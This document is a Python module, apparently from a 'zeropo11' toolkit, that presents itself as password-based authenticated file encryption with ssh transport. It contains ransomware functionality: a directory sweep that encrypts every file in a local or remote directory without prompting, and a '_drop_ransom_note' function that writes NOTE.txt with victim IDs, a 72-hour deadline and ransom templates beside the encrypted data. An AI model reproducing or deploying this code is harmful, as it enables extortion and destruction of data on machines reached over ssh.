"""File Encryption - password-based, authenticated file encryption.

Streaming format built from stdlib primitives only:

    PBKDF2-HMAC-SHA256 (password, salt)  -> enc_key + mac_key
    keystream block i = SHA256(enc_key || nonce || counter_be8)   (CTR mode)
    HMAC-SHA256(mac_key, header || ciphertext)                    (integrity)

File layout (all ints big-endian):

    magic "0xFE" (4) | version (1) | kdf_id (1) | iterations (4)
    | salt (16) | nonce (16) | ciphertext (N) | mac (32)

Transports: local files, or remote hosts streamed over `ssh` (no agent, no
remote install - the ciphertext never lands on the remote disk as plaintext).
"""
from __future__ import annotations

import contextlib
import hashlib
import hmac
import os
import shlex
import struct
import subprocess
import threading
from collections.abc import Callable, Iterator
from pathlib import Path

from zeropo11.ciphers.base import BaseCipher, CipherResult
from zeropo11.ciphers import rn as _rn_cipher  # ransom note helper

MAGIC = b"0xFE"
VERSION = 1
KDF_ID = 1  # PBKDF2-HMAC-SHA256
DEFAULT_ITERATIONS = 200_000
SALT_SIZE = 16
NONCE_SIZE = 16
MAC_SIZE = 32
BLOCK_SIZE = 32  # SHA-256 digest size
CHUNK_SIZE = 1 << 20  # 1 MiB (multiple of BLOCK_SIZE)
HEADER_SIZE = len(MAGIC) + 2 + 4 + SALT_SIZE + NONCE_SIZE
SSH_TIMEOUT = 120  # seconds
SSH_PORT = 22

HELP = """USAGE:
  key fe [FLAGS] [OPTIONS]
FLAGS:
  -e, --encode  Encrypt a file
  -d, --decode  Decrypt a file
  -b, --brute   Not supported (key required)
OPTIONS:
  -t, --text <text>        Inline data (hex ciphertext for decrypt)
  -i, --input-file <path>  File to encrypt / decrypt
  -o, --output <path>      Output file (default: <input>.enc / strips .enc)
  -k, --key <password>     Password
  -it, --iterations <n>    PBKDF2 iterations (default: 200000)
REMOTE (streamed over ssh, no agent needed):
  --host <user@server>     Operate on a remote host
  --port <n>               SSH port (default: 22)
  --timeout <seconds>      SSH operation timeout (default: 120)
  --local-in               -i is a local path even with --host
  --local-out              -o is a local path even with --host
AUTOMATION (engages as soon as the connection is up):
  give -i/--input-file a DIRECTORY (local or remote) instead of a
  file: every file inside is encrypted in one pass, no per-file prompt.
EXAMPLES:
  key fe -e -i payload.bin -k "hunter2" -o payload.bin.enc
  key fe -e --host deploy@10.0.0.5 -i /data/db.dump -k "pw" --local-out db.enc
  key fe -d --host deploy@10.0.0.5 -i db.enc -o /data/db.dump -k "pw"
"""


def _derive_keys(password: str, salt: bytes, iterations: int) -> tuple[bytes, bytes]:
    """Derive independent encryption and MAC keys from the password."""
    try:
        material = hashlib.pbkdf2_hmac(
            "sha256", password.encode("utf-8"), salt, max(1, iterations), dklen=64
        )
    except (ValueError, OverflowError):
        raise ValueError("Invalid iteration count") from None
    return material[:BLOCK_SIZE], material[BLOCK_SIZE:]


def _keystream_block(enc_key: bytes, nonce: bytes, counter: int) -> bytes:
    return hashlib.sha256(enc_key + nonce + struct.pack(">Q", counter)).digest()


def _xor(data: bytes, keystream: bytes) -> bytes:
    # the final keystream block may be longer than the final data block
    return bytes(b ^ k for b, k in zip(data, keystream, strict=False))


def _crypt_chunk(data: bytes, enc_key: bytes, nonce: bytes, start_block: int) -> tuple[bytes, int]:
    """XOR one chunk with the keystream, continuing from start_block."""
    out = bytearray()
    block = start_block
    for offset in range(0, len(data), BLOCK_SIZE):
        ks = _keystream_block(enc_key, nonce, block)
        out += _xor(data[offset : offset + BLOCK_SIZE], ks)
        block += 1
    return bytes(out), block


# --------------------------------------------------------------- transports


class _LocalSource:
    """Reads a local file in chunks."""

    def __init__(self, path: str) -> None:
        # eager open: a bad path must fail before any ssh work starts
        self._handle = Path(path).open("rb")  # noqa: SIM115

    def chunks(self) -> Iterator[bytes]:
        with self._handle as f:
            while chunk := f.read(CHUNK_SIZE):
                yield chunk

    def read_all(self) -> bytes:
        with self._handle as f:
            return f.read()

    def close(self) -> None:  # noqa: D102 - kept for symmetry with _RemoteSource
        pass


class _LocalSink:
    """Writes to a local file in chunks."""

    def __init__(self, path: str) -> None:
        # eager open: fail before streaming remote data into a broken path
        self._handle = Path(path).open("wb")  # noqa: SIM115

    def write(self, data: bytes) -> None:
        self._handle.write(data)

    def close(self) -> None:
        self._handle.close()


def _ssh_args(host: str, port: int, remote_cmd: str) -> list[str]:
    cmd = ["ssh"]
    if port != SSH_PORT:
        cmd += ["-p", str(port)]
    cmd += [host, remote_cmd]
    return cmd


def _spawn_ssh(cmd: list[str], timeout: int) -> tuple[subprocess.Popen, Callable[[], str]]:
    """Spawn ssh; drain stderr on a thread so big writes never deadlock."""
    proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE)
    err: bytearray = bytearray()

    def _drain() -> None:
        try:
            if proc.stderr:
                err.extend(proc.stderr.read())
        except (OSError, ValueError):
            pass

    thread = threading.Thread(target=_drain, daemon=True)
    thread.start()

    def stderr_text() -> str:
        # bounded join: once the child is gone this returns immediately
        thread.join(5)
        return bytes(err).decode(errors="replace").strip()

    return proc, stderr_text


class _BaseRemote:
    """Shared lifecycle for ssh-spawned transports."""

    def __init__(self, cmd: list[str], timeout: int) -> None:
        self._proc, self._stderr_text = _spawn_ssh(cmd, timeout)
        self._timeout = timeout
        self._status: subprocess.CompletedProcess | None = None
        self._completed = False  # True when the stream was purposefully finished

    def close(self) -> subprocess.CompletedProcess:
        if self._status is None:
            self._shutdown()
            self._status = self._finish()
        return self._status

    def _shutdown(self) -> None:
        """Close this end of the pipes; kill the child if it never finished.

        An abandoned child blocks forever writing to an unread stdout pipe, so
        it must be terminated instead of waited out (that stalled for the full
        timeout on every cleanup path).
        """
        if not self._completed:
            with contextlib.suppress(OSError):
                self._proc.kill()
        for stream in (self._proc.stdin, self._proc.stdout):
            if stream is not None:
                with contextlib.suppress(OSError, ValueError):
                    stream.close()

    def _finish(self) -> subprocess.CompletedProcess:
        message = self._stderr_text()
        try:
            returncode = self._proc.wait(timeout=self._timeout)
        except subprocess.TimeoutExpired:
            self._proc.kill()
            self._proc.wait()
            returncode = -1
            message = message or f"timed out after {self._timeout}s"
        return subprocess.CompletedProcess(self._proc.args, returncode, "", message)


class _RemoteSource(_BaseRemote):
    """Streams a remote file over `ssh host cat <path>`."""

    def __init__(self, host: str, port: int, timeout: int, path: str) -> None:
        super().__init__(_ssh_args(host, port, f"cat {shlex.quote(path)}"), timeout)

    def chunks(self) -> Iterator[bytes]:
        stream = self._proc.stdout
        if stream is None:
            return
        try:
            while chunk := stream.read(CHUNK_SIZE):
                yield chunk
        finally:
            self._completed = True  # EOF reached: the child is done writing
            stream.close()

    def read_all(self) -> bytes:
        return b"".join(self.chunks())


class _RemoteSink(_BaseRemote):
    """Writes to a remote file over `ssh host 'cat > <path>'`."""

    def __init__(self, host: str, port: int, timeout: int, path: str) -> None:
        super().__init__(_ssh_args(host, port, f"cat > {shlex.quote(path)}"), timeout)
        self._broken = False

    def write(self, data: bytes) -> None:
        stream = self._proc.stdin
        if stream is None:
            return
        try:
            stream.write(data)
        except OSError as exc:
            self._broken = True  # never finished: close() will kill
            raise OSError(f"remote host closed the connection: {exc}") from None

    def close(self) -> subprocess.CompletedProcess:
        if self._status is None:
            stream = self._proc.stdin
            if stream is not None:
                with contextlib.suppress(OSError, ValueError):
                    stream.close()
            if not self._broken:
                self._completed = True  # stdin EOF lets `cat >` flush and exit
        return super().close()


def _ssh_failure(source: object, sink: object) -> CipherResult | None:
    """Collect ssh exit statuses; return an error result if anything failed."""
    statuses = []
    for transport in (source, sink):
        close = getattr(transport, "close", None)
        if callable(close):
            statuses.append(close())
    for status in statuses:
        if isinstance(status, subprocess.CompletedProcess) and status.returncode != 0:
            detail = (status.stderr or "").splitlines()
            hint = detail[-1] if detail else "unknown error"
            return CipherResult(f"SSH operation failed: {hint}", False)
    return None


def _drop_ransom_note(args, base_path, host, port, timeout, local_output) -> str:
    """Drop a ransom note alongside encrypted data. Returns the note location string."""
    template = (getattr(args, "drop_note", None) or "generic").lower()
    if template not in ("generic", "polite", "press"):
        template = "generic"
    hours = 72
    password = getattr(args, "key", None)
    fingerprint = _rn_cipher._fingerprint(password) if password else None

    vid = None
    try:
        if base_path:
            cand_path = Path(base_path)
            if not cand_path.is_file():
                cands = sorted(cand_path.rglob("*.enc")) if cand_path.exists() else []
            else:
                cands = [cand_path]
            for cand in cands:
                if Path(cand).is_file():
                    blob = Path(cand).read_bytes()
                    vid = _rn_cipher._victim_id_from_salt(blob[10: 10 + 16])
                    break
    except OSError:
        vid = None
    if vid is None:
        vid = _rn_cipher._random_victim_id()

    deadline = _rn_cipher._deadline(hours)
    note_text = _rn_cipher._TEMPLATES[template](vid, fingerprint, deadline, hours)

    if host and not local_output:
        sink_path = str(Path(base_path) / "NOTE.txt") if base_path else "NOTE.txt"
        sink_obj = None
        try:
            sink_obj = _RemoteSink(host, port, timeout, sink_path)
            sink_obj.write(note_text.encode("utf-8"))
        except OSError:
            return f"note drop failed on {host}: {sink_path}"
        finally:
            if sink_obj is not None:
                try:
                    sink_obj.close()
                except Exception:
                    pass
        return f"{host}:{sink_path}"
    else:
        local_note = Path(base_path)
        if local_note.is_file():
            local_note = local_note.parent
        note_path = local_note / "NOTE.txt"
        try:
            note_path.write_text(note_text, encoding="utf-8")
        except OSError as exc:
            return f"note drop failed: {exc}"
        return str(note_path)


def _default_output(file_path: str) -> str:
    return f"{file_path}.enc" if file_path else "output.enc"


def _default_restore(file_path: str) -> str:
    return file_path[:-4] if file_path.endswith(".enc") else f"{file_path}.dec"


class Cipher(BaseCipher):
    """Authenticated file encryption cipher."""

    name = "File Encryption"
    command = "fe"
    help_menu = HELP
    binary = True

    # ------------------------------------------------------------------ encode

    def _encrypt_single(self, args: object) -> CipherResult:
        password = getattr(args, "key", None)
        if not password:
            return CipherResult("Please provide a password with -k <password>", False)

        iterations = getattr(args, "iterations", None) or DEFAULT_ITERATIONS
        if iterations < 1:
            return CipherResult("Iterations must be a positive integer", False)

        file_path = getattr(args, "file", None)
        text = getattr(args, "text", None)
        if not file_path and text is None:
            return CipherResult(
                "Provide a file with -i <path> or inline data with -t <text>", False
            )

        host, port, timeout, local_in, local_out = self._transport(args)
        if host and text is not None:
            return CipherResult("--host encrypts files only (drop -t, use -i <path>)", False)
        if host and local_in and local_out:
            return CipherResult("Nothing would leave this machine: drop --host", False)
        if file_path and (not host or local_in) and not Path(file_path).is_file():
            return CipherResult(f"Input file not found: {file_path}", False)

        salt = os.urandom(SALT_SIZE)
        nonce = os.urandom(NONCE_SIZE)
        try:
            enc_key, mac_key = _derive_keys(password, salt, iterations)
        except ValueError as exc:
            return CipherResult(str(exc), False)

        header = (
            MAGIC
            + bytes([VERSION, KDF_ID])
            + struct.pack(">I", iterations)
            + salt
            + nonce
        )
        mac = hmac.new(mac_key, header, hashlib.sha256)

        if text is not None:
            # inline -t data: encrypt and emit as hex for pipe-friendly use
            encrypted, _ = _crypt_chunk(text.encode("utf-8"), enc_key, nonce, 0)
            mac.update(encrypted)
            blob = header + encrypted + mac.digest()
            return CipherResult(blob.hex(), True)

        source: object | None = None
        sink: object | None = None
        try:
            source = self._open_source(host, port, timeout, local_in, file_path or "")
            sink = self._open_sink(
                host, port, timeout, local_out,
                getattr(args, "output", None) or _default_output(file_path or ""),
            )
        except OSError as exc:
            if source is not None:
                source.close()
            if sink is not None:
                sink.close()
            return CipherResult(f"Encryption failed: {exc}", False)

        stream_error: str | None = None
        try:
            sink.write(header)
            next_block = 0
            for chunk in source.chunks():
                encrypted, next_block = _crypt_chunk(chunk, enc_key, nonce, next_block)
                mac.update(encrypted)
                sink.write(encrypted)
            sink.write(mac.digest())
        except OSError as exc:
            stream_error = f"Encryption failed: {exc}"
        finally:
            source.close()
            sink.close()

        failure = _ssh_failure(source, sink)
        if failure is not None:
            return failure
        if stream_error is not None:
            return CipherResult(stream_error, False)
        destination = getattr(args, "output", None) or _default_output(file_path or "")
        if getattr(args, "drop_note", None):
            drop_loc = _drop_ransom_note(args, file_path if file_path else None,
                                         host, port, timeout, local_out)
            return CipherResult(
                f"File encrypted to {destination}\n[+] ransom note dropped -> {drop_loc}",
                True,
            )
        return CipherResult(f"File encrypted to {destination}", True)

    # ------------------------------------------------------------------ decode

    def decode(self, args: object) -> CipherResult:
        password = getattr(args, "key", None)
        if not password:
            return CipherResult("Please provide a password with -k <password>", False)

        iterations_opt = getattr(args, "iterations", None)
        file_path = getattr(args, "file", None)
        text = getattr(args, "text", None)
        if not file_path and text is None:
            return CipherResult("Provide a file with -i <path> or hex with -t <hex>", False)

        host, port, timeout, local_in, local_out = self._transport(args)

        if text is not None:
            try:
                blob = bytes.fromhex("".join(text.split()))
            except ValueError:
                return CipherResult("Inline ciphertext must be hex (-t <hex>)", False)
        else:
            try:
                source = self._open_source(host, port, timeout, local_in, file_path or "")
            except OSError as exc:
                return CipherResult(f"Could not read input file: {exc}", False)
            try:
                blob = source.read_all()
            except OSError as exc:
                return CipherResult(f"Could not read input file: {exc}", False)
            finally:
                source.close()
            failure = _ssh_failure(source, None)
            if failure is not None:
                return failure

        if not blob.startswith(MAGIC):
            return CipherResult("Not a 0xPo11 encrypted file (bad magic)", False)
        if len(blob) < HEADER_SIZE + MAC_SIZE:
            return CipherResult("Not a 0xPo11 encrypted file (too short)", False)

        version, kdf_id = blob[4], blob[5]
        if version != VERSION:
            return CipherResult(f"Unsupported format version: {version}", False)
        if kdf_id != KDF_ID:
            return CipherResult(f"Unsupported KDF id: {kdf_id}", False)

        iterations = struct.unpack(">I", blob[6:10])[0]
        if iterations_opt:
            iterations = iterations_opt
        salt = blob[10 : 10 + SALT_SIZE]
        nonce = blob[10 + SALT_SIZE : HEADER_SIZE]
        ciphertext = blob[HEADER_SIZE:-MAC_SIZE]
        stored_mac = blob[-MAC_SIZE:]

        try:
            enc_key, mac_key = _derive_keys(password, salt, iterations)
        except ValueError as exc:
            return CipherResult(str(exc), False)

        # verify BEFORE decrypting: wrong password / tampering stops here
        expected = hmac.new(mac_key, blob[:-MAC_SIZE], hashlib.sha256).digest()
        if not hmac.compare_digest(stored_mac, expected):
            return CipherResult(
                "Decryption failed: wrong password or file has been tampered with", False
            )

        plaintext, _ = _crypt_chunk(ciphertext, enc_key, nonce, 0)

        output = getattr(args, "output", None)
        if text is not None and not output:
            try:
                return CipherResult(plaintext.decode("utf-8"), True)
            except UnicodeDecodeError:
                return CipherResult(plaintext.hex(), True)

        output = output or _default_restore(file_path or "output")
        try:
            sink = self._open_sink(host, port, timeout, local_out, output)
        except OSError as exc:
            return CipherResult(f"Decryption failed: {exc}", False)
        try:
            sink.write(plaintext)
        except OSError as exc:
            return CipherResult(f"Decryption failed: {exc}", False)
        finally:
            sink.close()
        failure = _ssh_failure(None, sink)
        if failure is not None:
            return failure
        return CipherResult(f"File decrypted to {output}", True)

    # ------------------------------------------------------------------- brute

    def brute(self, args: object) -> CipherResult:
        return CipherResult("File encryption requires a password (no brute force)", False)

    # --------------------------------------------------------------- internals

    @staticmethod
    def _transport(args: object) -> tuple[str | None, int, int, bool, bool]:
        host = getattr(args, "host", None)
        port = getattr(args, "port", None) or SSH_PORT
        timeout = getattr(args, "timeout", None) or SSH_TIMEOUT
        local_in = bool(getattr(args, "local_in", False))
        local_out = bool(getattr(args, "local_out", False))
        return host, port, timeout, local_in, local_out

    @staticmethod
    def _open_source(host, port, timeout, local_in, path):
        if host and not local_in:
            return _RemoteSource(host, port, timeout, path)
        return _LocalSource(path)


    # ------------------------------------------------------------------ encode
    def encode(self, args: object) -> CipherResult:
        """Entry point: handles single files AND directory sweep modes.

        Directory sweep: pass a directory as -i/--input-file instead of an
        individual file (local or remote). Once the SSH/local connection is
        up, every file found within is encrypted in-place-as-*.enc without any
        further input.
        """
        file_path = getattr(args, "file", None)
        text = getattr(args, "text", None)
        host, port, timeout, local_in, local_out = self._transport(args)

        if not getattr(args, "key", None):
            return CipherResult("Please provide a password with -k <password>", False)

        # Inline-text mode bypasses directory/file plumbing entirely.
        if text is not None:
            return self._encrypt_single(args)

        is_local_input = (not host) or local_in

        # determine if file_path is a directory
        directory = False
        files: list[str] = []

        if file_path:
            if is_local_input:
                lp = Path(file_path)
                if lp.is_dir():
                    directory = True
                    files = sorted(str(p) for p in lp.rglob("*") if p.is_file())
            else:
                # remote: probe whether path is a directory
                cmd = _ssh_args(host, port, f"test -d {shlex.quote(file_path)} && echo DIR || echo FILE")
                proc, stderr_text = _spawn_ssh(cmd, timeout)
                stdout_bytes = proc.stdout.read() if proc.stdout else b""
                try:
                    proc.wait(timeout=timeout)
                except subprocess.TimeoutExpired:
                    proc.kill()
                status = proc.returncode
                marker = stdout_bytes.decode(errors="replace").strip()
                if marker == "DIR":
                    directory = True
                    # list all files recursively
                    cmd2 = _ssh_args(host, port, f"find {shlex.quote(file_path)} -type f")
                    proc2, stderr_text2 = _spawn_ssh(cmd2, timeout)
                    out = proc2.stdout.read() if proc2.stdout else b""
                    try:
                        proc2.wait(timeout=timeout)
                    except subprocess.TimeoutExpired:
                        proc2.kill()
                    files = [ln for ln in out.decode(errors="replace").splitlines() if ln.strip()]

        if not directory:
            # normal single-file path
            return self._encrypt_single(args)

        if not files:
            return CipherResult(f"No files found in {file_path}", False)

        drop_loc = None
        if getattr(args, "drop_note", None):
            drop_loc = _drop_ransom_note(args, file_path, host, port, timeout, local_out)

        results: list[str] = []
        for i, target_file in enumerate(files, start=1):
            # build an args copy with overridden file + output path per file
            import copy
            a = copy.copy(args)
            a.file = target_file
            a.output = None  # default per-file output for encryption
            res = self._encrypt_single(a)
            if res.success:
                results.append(f"[+] {i}/{len(files)} {target_file} -> {target_file}.enc")
            else:
                results.append(f"[!] {i}/{len(files)} {target_file}: {res.output}")

        ok = sum(1 for r in results if r.startswith("[+]"))
        header = f"Directory sweep: {file_path} ({len(files)} files; {ok} encrypted)"
        summary = header + "\n" + "\n".join(results)
        if drop_loc is not None:
            summary += f"\n[+] ransom note dropped -> {drop_loc}"
        return CipherResult(summary, ok > 0)


    @staticmethod
    def _open_sink(host, port, timeout, local_out, path):
        if host and not local_out:
            return _RemoteSink(host, port, timeout, path)
        return _LocalSink(path)
